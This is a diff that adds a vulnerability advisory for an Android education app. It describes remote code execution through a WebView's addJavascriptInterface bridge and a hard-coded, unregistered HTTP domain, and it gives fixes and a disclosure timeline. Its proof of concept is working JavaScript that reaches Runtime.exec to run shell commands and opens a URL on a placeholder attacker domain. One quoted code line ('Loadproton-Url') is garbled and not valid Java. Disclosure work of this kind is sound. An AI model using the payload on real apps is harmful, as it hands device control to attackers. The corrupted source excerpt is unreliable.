@@ -1,0 +1,132 @@
+# Exploit Title: Australian Education App - Remote Code Execution
+# Date: 30/Jun/17
+# Exploit Author: MaXe
+# Vendor Homepage: https://play.google.com/store/apps/details?id=a1.bestsafebrowser2.com
+# Software Link: See APK archive websites
+# Screenshot: Refer to https://www.youtube.com/watch?v=_DCz0OqJzBI
+# Version: v6
+# Tested on: Android 4.1.0 (Google APIs) - API Level 16 - x86
+# CVE : N/A
+
+Australian Education App - Remote Code Execution (No MITM Required!)
+
+Version affected: v6
+
+App Info: The Android application reviewed, according to the developer, comes with all the benefits of "privacy" and "secure browsing", and special configuration for the Australian Education Industry.
+
+External Links:
+https://play.google.com/store/apps/details?id=a1.bestsafebrowser2.com
+
+
+Credits: MaXe (@InterN0T)
+Special Thanks: no1special
+Shouts: SubHacker and the rest of the awesome infosec community.
+
+
+-:: The Advisory ::-
+The Android application is vulnerable to Remote Code Execution attacks. This is caused by the following lines of code within the
+\a1\bestsafebrowser2\com\main.java file: (Lines 133 - 140)
+    public static String _activity_create(boolean bl) throws Exception {
+        main.mostCurrent._activity.RemoveAllViews();
+        Common.ProgressDialogShow(main.mostCurrent.activityBA, "Attempting to access the Internet");
+        new Phone();
+        Object object = mostCurrent;
+        _googleurl = "http://www.tsearch.com.au";
+        main.mostCurrent._activity.LoadLayout("Start", main.mostCurrent.activityBA);
+        object = main.mostCurrent._activity;
+
+and
+
+Lines 444 - 450:
+    public static String _tr_tick() throws Exception {
+        ...
+        object = main.mostCurrent._webviewextras1;
+        WebViewExtras.clearCache((WebView)main.mostCurrent._webview1.getObject(), true);
+        object = main.mostCurrent._webviewextras1;
+        WebViewExtras.addJavascriptInterface(main.mostCurrent.activityBA, (WebView)main.mostCurrent._webview1.getObject(), "B4A");
+        object = main.mostCurrent._webview1;
+        object2 = mostCurrent;
+        object.Loadproton-Url(_googleurl);
+
+In addition to the above, the following App configuration also aids in the exploitability of this issue: (File: AndroidManifest.xml, Line: 3)
+    <uses-sdk android:minSdkVersion="5" android:targetSdkVersion="14" />
+
+If an attacker registers the domain "tsearch.com.au" (it is currently NOT registered) and creates a DNS record for "www.tsearch.com.au" then the attacker has full control over anyone who installs and runs this app. This vulnerability can be used to execute arbitrary Java code in the context of the application.
+
+In addition to the above, in case someone has registered "tsearch.com.au", then if an attacker performs a MITM attack against "www.tsearch.com.au" by e.g. hijacking the domain name, DNS, IP prefix, or by serving a malicious wireless access point (or hijacking a legitimate one), or by hacking the server at "www.tsearch.com.au", then the attacker can also abuse this vulnerability.
+
+The root cause of this vulnerability is caused by addJavascriptInterface() within the WebViewer, which in older API versions can be used to execute arbitrary Java code by using reflection to access public methods with attacker provided JavaScript.
+
+
+-:: Proof of Concept ::-
+A successful attack that makes "www.tsearch.com.au" serve the following code:
+<script>
+  function execute(cmd){
+    return B4A.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmd);
+  }
+  execute(['/system/bin/sh', '-c', 'echo InterN0T was here > /data/data/a1.bestsafebrowser2.com/owned']);
+  execute(['/system/bin/sh', '-c', 'am start -a android.intent.action.VIEW -d "http://attacker-domain.tld/video.mp4"']);
+  </script>
+  This application has been owned.
+
+Will make the Android application create a new file in the App directory named: owned, and also play a video chosen by the attacker as an example.
+
+Instead of creating a new file, the attacker can also use the "drozer" payload for example. Refer to the references further below.
+
+
+-:: Solution ::-
+The Android app code should not use the addJavaScriptInterface() function. Instead the following code should be used:
+    WebView webView = new WebView(this);
+    setContentView(webView);
+    ...
+Alternatively, the application manifest should specify API levels JELLY_BEAN_MR1 and above as follows:
+    <manifest>
+    <uses-sdk android:minSdkVersion="17" />
+    ...
+    </manifest>
+
+The URL used ("http://www.tsearch.com.au") should ALSO use HTTPS (and verify the hostname and certificate properly).
+
+Last but not least, the following code can also be used to determine whether the addJavascriptInterface should be enabled or not:
+    private void exposeJsInterface() {
+        if (VERSION.SDK_INT < 17) {
+            Log.i(TAG, "addJavascriptInterface() bridge disabled.");
+        } else {
+            addJavascriptInterface(Object, "EVENT_NAME_HERE");
+        }
+    }
+
+
+
+References:
+http://50.56.33.56/blog/?p=314
+https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)
+https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/
+https://labs.mwrinfosecurity.com/advisories/webview-addjavascriptinterface-remote-code-execution/
+https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=129859614
+
+Filename: Australian Education App_vv6.apk
+File size: 16,409,964 Bytes
+
+md5: 86b4fab4328a2c4e54db6f1d378b7bb9
+sha1: 9786bb89fcfff756d10588bf9a3a9c7439dcc74e
+sha256: 2420a3067ba1b120b09ea8737fe8c822b6fea7dd7d860abb84a41611a1f0f7ed
+
+App Name: Australian Education App
+Package Name: a1.bestsafebrowser2.com
+Package Version: v6
+
+:)
+
+=== EOF ===
+
+Video demo:
+https://www.youtube.com/watch?v=_DCz0OqJzBI
+
+FULL POC Archive:
+https://mega.nz/#!NOp20DZB!mogOpSCFltdEvAVwshgZV-IPvU1ucNvud68DBDCHRD0
+
+The following is the timeline:
+29 June 2017 - Vendor is notified.
+29 June 2017 - Vendor pulls apps from app store and files privacy and trademark complaints with YouTube. Vendor does not intend to fix vulnerabilities.
+30 June 2017 - All disclosure websites notified, including Exploit-DB.
